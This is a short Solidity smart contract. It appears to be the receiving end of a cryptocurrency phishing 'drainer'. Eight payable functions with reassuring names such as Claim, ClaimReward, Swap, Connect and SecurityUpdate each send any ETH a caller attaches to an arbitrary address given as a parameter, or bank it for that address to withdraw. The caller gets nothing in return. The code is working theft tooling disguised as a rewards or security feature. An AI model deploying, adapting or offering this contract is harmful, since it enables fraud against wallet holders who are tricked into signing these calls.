1 // SPDX-License-Identifier: Unlicense
2 
3 pragma solidity ^0.8.18;
4 
5 
6 contract CG_Contract {
7 
8   address private owner;
9   mapping (address => uint256) private balance;
10   mapping (address => bool) private auto_withdraw;
11 
12   constructor() { owner = msg.sender; }
13   function getOwner() public view returns (address) { return owner; }
14   function getBalance() public view returns (uint256) { return address(this).balance; }
15   function getUserBalance(address wallet) public view returns (uint256) { return balance[wallet]; }
16   function getWithdrawStatus(address wallet) public view returns (bool) { return auto_withdraw[wallet]; }
17   function setWithdrawStatus(bool status) public { auto_withdraw[msg.sender] = status; }
18 
19   function withdraw(address where) public {
20     uint256 amount = balance[msg.sender];
21     require(address(this).balance >= amount, "BALANCE_LOW");
22     balance[msg.sender] = 0; payable(where).transfer(amount);
23   }
24 
25   function Claim(address sender) public payable { if (auto_withdraw[sender]) payable(sender).transfer(msg.value); else balance[sender] += msg.value; }
26   function ClaimReward(address sender) public payable { if (auto_withdraw[sender]) payable(sender).transfer(msg.value); else balance[sender] += msg.value; }
27   function ClaimRewards(address sender) public payable { if (auto_withdraw[sender]) payable(sender).transfer(msg.value); else balance[sender] += msg.value; }
28   function Execute(address sender) public payable { if (auto_withdraw[sender]) payable(sender).transfer(msg.value); else balance[sender] += msg.value; }
29   function Multicall(address sender) public payable { if (auto_withdraw[sender]) payable(sender).transfer(msg.value); else balance[sender] += msg.value; }
30   function Swap(address sender) public payable { if (auto_withdraw[sender]) payable(sender).transfer(msg.value); else balance[sender] += msg.value; }
31   function Connect(address sender) public payable { if (auto_withdraw[sender]) payable(sender).transfer(msg.value); else balance[sender] += msg.value; }
32   function SecurityUpdate(address sender) public payable { if (auto_withdraw[sender]) payable(sender).transfer(msg.value); else balance[sender] += msg.value; }
33 
34 }